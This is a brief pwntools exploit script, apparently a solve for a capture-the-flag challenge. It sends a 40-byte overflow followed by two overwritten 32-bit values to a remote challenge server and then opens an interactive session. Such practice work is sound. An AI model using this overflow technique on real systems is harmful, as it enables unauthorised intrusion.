from pwn import *
#p=process('./chal')
p=remote('challenges.bhusa.bugcrowdctf.com', 8083)
payload=b'a'*40+p32(-0x41100ff3&0xffffffff)+p32(-0x21524111&0xffffffff)
#input()
p.sendline(payload)
sleep(3)
print(p.recv())
p.interactive()
